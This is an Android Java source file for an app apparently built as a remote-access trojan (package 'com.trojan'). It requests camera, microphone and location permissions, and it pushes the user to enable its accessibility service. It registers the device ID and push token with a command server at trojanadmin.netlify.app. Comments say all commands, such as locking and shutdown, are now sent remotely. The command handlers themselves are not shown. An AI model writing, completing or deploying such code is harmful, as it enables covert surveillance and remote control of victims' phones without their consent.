package com.trojan;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.messaging.FirebaseMessaging;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    private static final int PERMISSIONS_REQUEST_CODE = 101;

    // --- UPGRADED: Added new permissions required for camera and audio recording ---
    private static final String[] PERMISSIONS_TO_REQUEST = {
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
            // Note: WRITE_EXTERNAL_STORAGE is handled by the Manifest's maxSdkVersion for older Android.
    };

    private TextView tvDeviceInfo;
    private Button btnOpenAccessibility;
    // --- REMOVED: Test buttons are no longer needed as all commands are remote ---
    // private Button btnTestLock;
    // private Button btnTestShutdown;

    private RequestQueue requestQueue;
    private int retryCount = 0;
    private static final int MAX_RETRIES = 3;
    private static final long INITIAL_RETRY_DELAY_MS = 5000;

    @SuppressLint("HardwareIds")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // --- Simplified UI element initialization ---
        tvDeviceInfo = findViewById(R.id.tvDeviceInfo);
        btnOpenAccessibility = findViewById(R.id.btnOpenAccessibility);

        requestQueue = Volley.newRequestQueue(this);

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        String deviceInfoText = "Device ID:\n" + deviceId;
        tvDeviceInfo.setText(deviceInfoText);

        // --- NEW: Start the permission request flow as soon as the app opens ---
        requestAppPermissions();

        // Get FCM token and register with the server (this is unchanged)
        getTokenAndRegisterWithNetlify(deviceId);

        // Listener for the Accessibility Settings button (unchanged)
        btnOpenAccessibility.setOnClickListener(v -> {
            Toast.makeText(this, "Find 'trojan' in the list and enable it.", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        });

        // --- REMOVED: Obsolete click listeners for test buttons ---
    }

    // --- NEW: Logic to check for and request any missing permissions ---
    private void requestAppPermissions() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            // Permissions are granted at install time on older versions.
            return;
        }

        List<String> neededPermissions = new ArrayList<>();
        for (String permission : PERMISSIONS_TO_REQUEST) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(permission);
            }
        }

        if (!neededPermissions.isEmpty()) {
            Log.d(TAG, "Requesting permissions: " + neededPermissions);
            ActivityCompat.requestPermissions(this, neededPermissions.toArray(new String[0]), PERMISSIONS_REQUEST_CODE);
        } else {
            Log.d(TAG, "All necessary permissions have already been granted.");
        }
    }

    // --- NEW: Callback to handle the result of the permission request dialog ---
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    Log.i(TAG, "Permission GRANTED: " + permissions[i]);
                } else {
                    Log.w(TAG, "Permission DENIED: " + permissions[i]);
                }
            }
            // Check again if any permissions are still missing and inform the user.
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (!allGranted) {
                Toast.makeText(this, "Some features may not work without all permissions.", Toast.LENGTH_LONG).show();
            }
        }
    }

    // --- The rest of the file (token registration logic) is unchanged ---

    private void getTokenAndRegisterWithNetlify(String deviceId) {
        tvDeviceInfo.append("\n\nFetching FCM Token...");
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
            if (!task.isSuccessful()) {
                Log.w(TAG, "Fetching FCM registration token failed", task.getException());
                tvDeviceInfo.append("\n\nFetching FCM Token Failed.");
                return;
            }
            String token = task.getResult();
            Log.d(TAG, "FCM Token acquired. Starting registration process.");
            retryCount = 0;
            registerDeviceWithNetlify(deviceId, token);
        });
    }

    private void registerDeviceWithNetlify(String deviceId, String token) {
        if (retryCount == 0) {
            tvDeviceInfo.append("\n\nUploading to server...");
        }

        String url = "https://trojanadmin.netlify.app/.netlify/functions/register-device";
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("token", token);
        } catch (JSONException e) {
            tvDeviceInfo.append("\n\nError creating JSON payload.");
            return;
        }

        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(
                Request.Method.POST, url, postData,
                response -> {
                    Log.d("NETLIFY_REGISTER", "Success: " + response.toString());
                    tvDeviceInfo.append("\n\n✅ Token successfully registered!");
                    retryCount = 0;
                },
                error -> {
                    Log.e("NETLIFY_REGISTER", "Error: " + error.toString());
                    scheduleRetry(deviceId, token);
                }
        );
        requestQueue.add(jsonObjectRequest);
    }

    private void scheduleRetry(String deviceId, String token) {
        retryCount++;
        if (retryCount <= MAX_RETRIES) {
            long delayMs = INITIAL_RETRY_DELAY_MS * (long) Math.pow(2, retryCount - 1);
            String retryMessage = String.format("\n\nUpload failed. Retrying in %d seconds... (Attempt %d/%d)", delayMs / 1000, retryCount, MAX_RETRIES);
            tvDeviceInfo.append(retryMessage);
            Log.w(TAG, retryMessage);
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                Log.i(TAG, "Executing scheduled retry...");
                registerDeviceWithNetlify(deviceId, token);
            }, delayMs);
        } else {
            String finalFailMessage = "\n\n❌ Upload failed after multiple attempts. Please check network or restart app.";
            tvDeviceInfo.append(finalFailMessage);
            Log.e(TAG, "Max retries reached. Upload failed permanently.");
        }
    }
}
